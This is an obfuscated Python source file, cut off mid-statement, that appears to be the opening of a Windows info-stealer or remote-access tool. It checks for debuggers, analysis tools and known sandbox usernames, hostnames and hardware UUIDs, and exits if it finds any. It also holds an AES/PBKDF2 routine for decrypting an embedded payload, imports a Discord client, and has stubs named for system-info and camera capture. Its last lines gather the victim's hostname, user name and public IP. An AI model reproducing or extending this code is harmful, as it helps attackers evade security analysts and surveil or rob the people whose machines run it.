
def PCXURTEGJFSBBHHWLLLULWOEEHRLHEFYTPBXBTLGBKAJMXVIGAUAEBSTKUVHSMDPUZZGHMGQMVEDOWRQLPEPNQMQIZRVOJJA():
    import os
    import socket
    import subprocess
    import ctypes
    import sys
    import psutil

    RFGVYWBUFVVECMWTFHBBACDJZKMRSJQCUEXLSXFHNAIALRMZQZEGPJBRIOVXGLCEJZEJPB = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'Bruno' 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', 'stephpie']
    PIZYFCNSGXOMWCXPZJIOZJJJREQXLRJCUZLIMXUZBXKGVANBEUYRLPJ = ['0CC47AC83802', 'BEE7370C-8C0C-4', 'DESKTOP-ET51AJO', '965543', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42', 'test']
    HVMTFKHKERJUWKLDNYWFFFFQHUYXIRZJMRMYDIKLUSDEAQDHCXYASSWDCVQWCURREGEUEEHZFIMLLPQEUNORYRHDQHDB     = ['671BC5F7-4B0F-FF43-B923-8B1645581DC8', '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
    IYQOQRWHGFBIJNEHDMOYCSWSVJHXUKECAYQCFKEOJQJRFMBZIJNRWDFY   = ['cheatengine', 'cheat engine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'radare', 'dbg', 'immunitydbg', 'dnspy', 'softice', 'edb', 'debugger', 'visual studio debugger', 'lldb', 'gdb', 'valgrind', 'hex-rays', 'disassembler', 'tracer', 'debugview', 'procdump', 'strace', 'ltrace', 'drmemory', 'decompiler', 'hopper', 'binary ninja', 'bochs', 'vdb', 'frida', 'api monitor', 'process hacker', 'sysinternals', 'procexp', 'process explorer', 'monitor tool', 'vmmap', 'xperf', 'perfview', 'py-spy', 'strace-log']

    try:
        if sys.gettrace() is not None:
            return True
    except: pass

    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except: pass

    try:
        for v4r_proc in psutil.process_iter(['name']):
            try:
                ZNXZLXYRIQLMTCZRBEEFMSFMAPPEUSJOUFGBPVESVZUKHBRQUIHDPP = str(v4r_proc.info['name']).lower()
                if any(debugger in ZNXZLXYRIQLMTCZRBEEFMSFMAPPEUSJOUFGBPVESVZUKHBRQUIHDPP for debugger in IYQOQRWHGFBIJNEHDMOYCSWSVJHXUKECAYQCFKEOJQJRFMBZIJNRWDFY):
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
            continue
    except: pass

    try:
        if os.getlogin() in RFGVYWBUFVVECMWTFHBBACDJZKMRSJQCUEXLSXFHNAIALRMZQZEGPJBRIOVXGLCEJZEJPB:
            return True
        elif os.getlogin().lower() in [v4r_u53rn4m3.lower() for v4r_u53rn4m3 in RFGVYWBUFVVECMWTFHBBACDJZKMRSJQCUEXLSXFHNAIALRMZQZEGPJBRIOVXGLCEJZEJPB]:
            return True
    except: pass

    try:
        if socket.gethostname() in PIZYFCNSGXOMWCXPZJIOZJJJREQXLRJCUZLIMXUZBXKGVANBEUYRLPJ:
            return True
        elif socket.gethostname().lower() in [v4r_h05tn4m3.lower() for v4r_h05tn4m3 in PIZYFCNSGXOMWCXPZJIOZJJJREQXLRJCUZLIMXUZBXKGVANBEUYRLPJ]:
            return True
    except: pass

    try: 
        if subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip() in HVMTFKHKERJUWKLDNYWFFFFQHUYXIRZJMRMYDIKLUSDEAQDHCXYASSWDCVQWCURREGEUEEHZFIMLLPQEUNORYRHDQHDB:
            return True
    except: pass

    return False

try: DZCOKIGQSJNVXQAWJYJYZOOWFCAWIFUDNGLVZWOSHCZIXGFPDTHGVETBMJPLEBAI = PCXURTEGJFSBBHHWLLLULWOEEHRLHEFYTPBXBTLGBKAJMXVIGAUAEBSTKUVHSMDPUZZGHMGQMVEDOWRQLPEPNQMQIZRVOJJA()
except: DZCOKIGQSJNVXQAWJYJYZOOWFCAWIFUDNGLVZWOSHCZIXGFPDTHGVETBMJPLEBAI = False

if DZCOKIGQSJNVXQAWJYJYZOOWFCAWIFUDNGLVZWOSHCZIXGFPDTHGVETBMJPLEBAI == True:
    import sys
    sys.exit()

import sys

def UBVAOPUSOGNONDOXHOMDQIHCRNKVIEIDVGHFGMPOEUDGBFVKWKXKFHUIRHCGVWBVVRMDAGXKUDMHEQXA():
    def VECQCQQMKYHLXJDIDAXCBWYUSBKQHDSCADUDFJJDEOAVDTVUGOXKGHAFPGCUZB():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM = VECQCQQMKYHLXJDIDAXCBWYUSBKQHDSCADUDFJJDEOAVDTVUGOXKGHAFPGCUZB()
        if TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM == True:
            return TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM
    except:
        return True
    
if UBVAOPUSOGNONDOXHOMDQIHCRNKVIEIDVGHFGMPOEUDGBFVKWKXKFHUIRHCGVWBVVRMDAGXKUDMHEQXA() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
import zipfile
import io
from json import loads
from urllib.request import urlopen
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def KASNLIRKRZSSFSXUSAXIRFVUYGKTREMIKIJDEFGHPOBQXQSLACUJCEEFECBVDJTJKOC(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG): 
    TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_system_info = None
    return TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_system_info

def IUSDIYYLVSWGXPYIXFSNQMPOOUBALVOVHPIOEEZYYICBVHFUZCERUWSYXGOXMJXOAVITZUXNPTAPHTMOUUWANTNFUKWS(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG):
    ANCSWJFCYPXILHRWSCYHOAJWMELPJKBWQWPMKGQDFAMBFHBZOMSNCMBCJYPGJGZEKYQX = None
    return ANCSWJFCYPXILHRWSCYHOAJWMELPJKBWQWPMKGQDFAMBFHBZOMSNCMBCJYPGJGZEKYQX

def THBLIOUFXHZAUYMPAOIIXBTEVSMTIDKUXCIGBUJCRYHGRBYMOMPPZQALHLGXHCROSYISY(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG):
    PLVUMDYCXFHKGEESNFQSVVPXDRMWQTPSAWPZMEMNPCOAILLMNRULLGMUDOXZUWXMUCFBQDUWJJBPBGVLYOTCWCG = None
    return PLVUMDYCXFHKGEESNFQSVVPXDRMWQTPSAWPZMEMNPCOAILLMNRULLGMUDOXZUWXMUCFBQDUWJJBPBGVLYOTCWCG

def PRRHVKIGAMSJHSPNATIKJLTQDEZDFFWEZRKDSJTZTXYELWPWPMNQAGM(): 
    HCOOUFPOBBVYXEFSQDSYLNXDJQKFYQREPQZWWACWAJVNHOHBROCSGBYZVC = None
    return HCOOUFPOBBVYXEFSQDSYLNXDJQKFYQREPQZWWACWAJVNHOHBROCSGBYZVC

def DHXAZPQGQPVVJJKBZJDJANFZJPUCVIVPURQRHVPZEFEPJNYERCDDNKUHZGEBVPXLQFARZWTJBDTIRWMDRGDEEGUWYI(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG): 
    AGTZIMNEBIIUMATLJGDEKDVBTAGANSFXMUQRIKWNWMKBASCCBXMIKQGFPBTQFNHVEFLCUWFOIQBWGMUIEIYVK = None
    BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN = None
    XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE = None
    WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR = None
    INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY = None
    LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY = None
    return AGTZIMNEBIIUMATLJGDEKDVBTAGANSFXMUQRIKWNWMKBASCCBXMIKQGFPBTQFNHVEFLCUWFOIQBWGMUIEIYVK, BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN, XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE, WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR, INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY, LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY

def BRNCEIHUVTVZUAEKHSVNSZMINBDCIWMCJJOUEGHMAITTJCYNPNNIEQWSFSCKUTKOXLIZYDG(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG):
    XBQOLQTWKNRPKXGMIQLGYQITMGLFGNEKTAPAUCNXQDDBPWSDQCUFVQGQI = None
    DMWTZECDUJWKDZQHGIDJKQHSIGQMAODGFYIWWZGMXPAICZMUXKCBXANJYFUKHJFNV = None
    PERCLUEBFLRONEZFFCKKGFNEAKCGFTORMIPOTPFKRUGEDKLYXZXOEYWQOFFEYYSDYWTYAQA = None
    return XBQOLQTWKNRPKXGMIQLGYQITMGLFGNEKTAPAUCNXQDDBPWSDQCUFVQGQI, DMWTZECDUJWKDZQHGIDJKQHSIGQMAODGFYIWWZGMXPAICZMUXKCBXANJYFUKHJFNV, PERCLUEBFLRONEZFFCKKGFNEAKCGFTORMIPOTPFKRUGEDKLYXZXOEYWQOFFEYYSDYWTYAQA

def GZVHSMVALADVVKXUZXRXBBPPVRKUJGNQKGJBWHKZVTNHYIVMZOUDICUPMRBHWHMDLQFIOMAIXJDDJGDDJDBQFTECAVYUXITJI(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG):
    ATHBYILMUJZNGHKJWEKPJMGUVDPNFJDOXAZZINEFCKUTMQPWRYIUYBZMQEJFFPYXYTZYIPTHKCRYLIQUUMAELVJWFTXFLFOJ = None
    return ATHBYILMUJZNGHKJWEKPJMGUVDPNFJDOXAZZINEFCKUTMQPWRYIUYBZMQEJFFPYXYTZYIPTHKCRYLIQUUMAELVJWFTXFLFOJ

def STBPRLBGCGNQEGNDTPGCAZHHJEDDXLRLVIINUEDYHKRZUWFEAPMWAOOXKCKBLGVCCMPOYEQFSAGI(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG):
    TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture = None
    return TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture

def GTPBYGSYPESNOOVUIZZLGMAHYBGBGHONMMCKMIILFOTDQFJQGORVKVLDYTOBNMHUUGQAJOOAQWTFSKFOAPR(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG): 
    ZTTTHKIYSZPSVFRCRFQRDHJUTKMWAWIYUNYPVJGZZWKRGYDAKIAEIHOLLACDMLCMTQGROBKCIQAS = None
    return ZTTTHKIYSZPSVFRCRFQRDHJUTKMWAWIYUNYPVJGZZWKRGYDAKIAEIHOLLACDMLCMTQGROBKCIQAS

def PWTLMMWABORVKPPSPAYTVAAXDPSRMQICKJQTDWXSSNSVCWHAITNNGJTRHMLVOLRMIYGPIWAOESIMHJDBLUDSAGL(): pass
def FTVVJPWCRRKQBVROFBRYVIPSFIZFEJUWJZTVWQLSYGTTIZXMHEMOPOJTPTEKHET(): pass
def NNKDCXFPYGGPFPOZRCOJTRQJGMYFWWTQEUUDEVRZUJQMIHELLFDRHGYUQQVWF(): pass
def XYSZNBQCLSXKEOOOMLZEYSZMRRCKXLNMDIRQZRZFCLBORWAXDVAKVRXEACFVWBBGMSSIOXFGRLQGBQTTJCAHKFONVODHYZGSBYIV(): pass
def VQHYJUHHAVPVCXYYWGIHFNMSAFHPOFLYSXTIBXSWWFPMGTZIZSSOXGSEKTJLLR(): pass
def CIJEOPULCZFCLQYBBORSPASWSTDSTNBKLSZXSJPYTTXRLWACPXCMBUXHVOKNQSCYTNKFMHJS(): pass
def ZUYKOZDCWGLXJPWISNFUHSEKMIDRRQSGBNAQFVDZNXOPWTRKNOXTDIEE(): pass
def HBDZWDVPHLOCOZGLBDZPEYELRMXYMSUVADOOYDZGLVESUYXDSBEIKEPQYXFN(): pass
def AHXERVRADZFHHELWEIOCFHFEGLGQSBDZEZLYSGJRCJXFNLKBWXIBXJWTFSDLDUAGRBO(): pass
def PMHVABMUQOHHTZPUJCUUTLMLFCAKRODYGDEVCWINLWBJYGGDFTTLCVZHTENAJWLMVG(): pass
def NKXSJHXEEXQUWIZIMHNCPQWYNKMQBCPFUOKEGXJKCOYTAWVLNPPORCTSXKUTZDVWYTHJLUKYETLNAAOGNZLBBJBERXFZDMZTU(): pass
def YLLCMYIKRYJNTESBWGBWUNHXXSLJIYGZDWHPNHODHDITRMBLEQVSGOWVQUCHUCSDBCQSLKCMELUKIFPWHHUVQOJG(): pass

def TGOLMBRZWFOUVAGMNFIOSPSQXNUCBIHPCHCLINEVRKTCRWETHADRPUWZLSMDHDCNFJEMWTCTWBLBY(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def HPXXWMILRRDGFNXCTSXFYPUPFONNWDEHJGFHUOUPMXVCNDLSZCWQKAAYVERVYYT():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def TVUVQKUHGITWECGYXHUAGRVGAZQCYWWJRFKJMCFHAQKKUDUWSAYQKZGHBMZGQQJYAMNJHUMP(TUIMBPUBLRYSQJOZDDICOTOGUSLJQSRBDGIOBZYAMZPNKJDYICAEGPHFOAMM, XKTHZHBKTQIIPDOFZJFYVYIYFZPMGRXKCPSXCNNTUPQIDCPDJCJFKCOQWIYLTSLWQOTUAKTAZMPNHET):
    def YUXZDPZGDRFLJOCPNXEKROXJNGIKZWGRVYSVFSRYLQDWHFEBYYPJUQFVHMQGNLZTX(FHYHNTPXJNNHFJZFPZPIUCUGQERHGIFJTOAZLDBFQIILKUKVOQELSYVC, JALOLFTVUBRYLKJRTALZIHVXFEDXAAAJGONGYLBKTRFWLEJOAZBZDDPRXVRYUDEQYQQOTPDJQG):
        FVVPGOLNAWFKTZZCSQFQXFQQIMGGSQHIJDEVMCOBCSSUGLVCXYIWPISBYSVDQ = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=JALOLFTVUBRYLKJRTALZIHVXFEDXAAAJGONGYLBKTRFWLEJOAZBZDDPRXVRYUDEQYQQOTPDJQG, iterations=100000, backend=default_backend())
        if isinstance(FHYHNTPXJNNHFJZFPZPIUCUGQERHGIFJTOAZLDBFQIILKUKVOQELSYVC, str):  
            FHYHNTPXJNNHFJZFPZPIUCUGQERHGIFJTOAZLDBFQIILKUKVOQELSYVC = FHYHNTPXJNNHFJZFPZPIUCUGQERHGIFJTOAZLDBFQIILKUKVOQELSYVC.encode()  
        return FVVPGOLNAWFKTZZCSQFQXFQQIMGGSQHIJDEVMCOBCSSUGLVCXYIWPISBYSVDQ.derive(FHYHNTPXJNNHFJZFPZPIUCUGQERHGIFJTOAZLDBFQIILKUKVOQELSYVC)

    TUIMBPUBLRYSQJOZDDICOTOGUSLJQSRBDGIOBZYAMZPNKJDYICAEGPHFOAMM_data = base64.b64decode(TUIMBPUBLRYSQJOZDDICOTOGUSLJQSRBDGIOBZYAMZPNKJDYICAEGPHFOAMM)
    JALOLFTVUBRYLKJRTALZIHVXFEDXAAAJGONGYLBKTRFWLEJOAZBZDDPRXVRYUDEQYQQOTPDJQG = TUIMBPUBLRYSQJOZDDICOTOGUSLJQSRBDGIOBZYAMZPNKJDYICAEGPHFOAMM_data[:16]
    YSYDXQKHADAHSXSHPVZPTEKHSBLEGJQUDEXETZJTQDFQPTECWCVAKIXTCMOWDTMGMNATPTPNOJMNIMEPUKXMWG = TUIMBPUBLRYSQJOZDDICOTOGUSLJQSRBDGIOBZYAMZPNKJDYICAEGPHFOAMM_data[16:32]
    TUIMBPUBLRYSQJOZDDICOTOGUSLJQSRBDGIOBZYAMZPNKJDYICAEGPHFOAMM_data = TUIMBPUBLRYSQJOZDDICOTOGUSLJQSRBDGIOBZYAMZPNKJDYICAEGPHFOAMM_data[32:]
    ALSSFCAZRVZMAXDIXJPUFPWDOHOAKQRHGDDVSAIODEVIWJTEZEUSJUIBZDUWJGRJOIUCFP = YUXZDPZGDRFLJOCPNXEKROXJNGIKZWGRVYSVFSRYLQDWHFEBYYPJUQFVHMQGNLZTX(XKTHZHBKTQIIPDOFZJFYVYIYFZPMGRXKCPSXCNNTUPQIDCPDJCJFKCOQWIYLTSLWQOTUAKTAZMPNHET, JALOLFTVUBRYLKJRTALZIHVXFEDXAAAJGONGYLBKTRFWLEJOAZBZDDPRXVRYUDEQYQQOTPDJQG)
    KGLZLOJQMSTCQSJREUUTETFORMXOXRZOTMQSGELEVQRGQEOOUZ = Cipher(algorithms.AES(ALSSFCAZRVZMAXDIXJPUFPWDOHOAKQRHGDDVSAIODEVIWJTEZEUSJUIBZDUWJGRJOIUCFP), modes.CBC(YSYDXQKHADAHSXSHPVZPTEKHSBLEGJQUDEXETZJTQDFQPTECWCVAKIXTCMOWDTMGMNATPTPNOJMNIMEPUKXMWG), backend=default_backend())
    AUQPHJAJHSTTMDVMEKRGRJIBEMJVFBCDNITJHTPDZDHUQUTKAELNC = KGLZLOJQMSTCQSJREUUTETFORMXOXRZOTMQSGELEVQRGQEOOUZ.decryptor()
    CUWREVCVSBNQIUWAEJLLFJDAGTZMNCERNEJAOURJQANKOWIGECIZLPKXLNHJM = AUQPHJAJHSTTMDVMEKRGRJIBEMJVFBCDNITJHTPDZDHUQUTKAELNC.update(TUIMBPUBLRYSQJOZDDICOTOGUSLJQSRBDGIOBZYAMZPNKJDYICAEGPHFOAMM_data) + AUQPHJAJHSTTMDVMEKRGRJIBEMJVFBCDNITJHTPDZDHUQUTKAELNC.finalize()
    WHUZKVLQBTEVFDYNPLXDHCPHAOYWTWSEDRISOSKYTDRELPNNWKGDPDIFSWJVDXZCDFLRRAEYCZQNVPOOBL = padding.PKCS7(128).unpadder()
    LOEJBIKSOKHDBXPIVSIRXLVCYGCVYZAJABKHVQQRNYMGPAQVUWIZSHXCZYVBGRZCVDBIIHTVZLKQIQAIGOECYVUXCBGDYZMMZNQ = WHUZKVLQBTEVFDYNPLXDHCPHAOYWTWSEDRISOSKYTDRELPNNWKGDPDIFSWJVDXZCDFLRRAEYCZQNVPOOBL.update(CUWREVCVSBNQIUWAEJLLFJDAGTZMNCERNEJAOURJQANKOWIGECIZLPKXLNHJM) + WHUZKVLQBTEVFDYNPLXDHCPHAOYWTWSEDRISOSKYTDRELPNNWKGDPDIFSWJVDXZCDFLRRAEYCZQNVPOOBL.finalize()
    return LOEJBIKSOKHDBXPIVSIRXLVCYGCVYZAJABKHVQQRNYMGPAQVUWIZSHXCZYVBGRZCVDBIIHTVZLKQIQAIGOECYVUXCBGDYZMMZNQ.decode()

TGOLMBRZWFOUVAGMNFIOSPSQXNUCBIHPCHCLINEVRKTCRWETHADRPUWZLSMDHDCNFJEMWTCTWBLBY("")

try: BZJKBOXPOJRTXZUXMOGUWDVDQJPFDYNYGCYFMYMLKEUSSNINJH    = socket.gethostname()
except: BZJKBOXPOJRTXZUXMOGUWDVDQJPFDYNYGCYFMYMLKEUSSNINJH = "None"

try: TABABGYGNEGEGTRMWONKLNRFKAROZGLEJSGWNNUOZZDDOSCZHBZCJIFJYGIPKOFVDVGLIILLYBFLIJWZELK    = os.getlogin()
except: TABABGYGNEGEGTRMWONKLNRFKAROZGLEJSGWNNUOZZDDOSCZHBZCJIFJYGIPKOFVDVGLIILLYBFLIJWZELK = "None"

try: MSHFCCICDZXNXUIOQIMFVBHSAOTRBSYVCEWJCGHYOHDBLRSPSYUMGZLZAOZMFE    = win32api.GetUserNameEx(win32api.NameDisplay)
except: MSHFCCICDZXNXUIOQIMFVBHSAOTRBSYVCEWJCGHYOHDBLRSPSYUMGZLZAOZMFE = "None"

try: BRMHIEVVSJOCHAPHFRRZHHEOTEYSUZSJDVOCWRYUQZFDKESQORWEOXNGHHZMIYPZOZUSWGKATQWZNXHPFYZQ    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: BRMHIEVVSJOCHAPHFRRZHHEOTEYSUZSJDVOCWRYUQZFDKESQORWEOXNGHHZMIYPZOZUSWGKATQWZNXHPFYZQ = "None"

try: JLHPALQZDHECTHPEWZNEUOITWNGFEZQRQSRCOGIGRVYPAQMNIRRXTNHDJBCVGKRBRTURPQFUSDIRZIIUBUMINWKTZJT    = socket.gethostbyname(socket.gethostname())
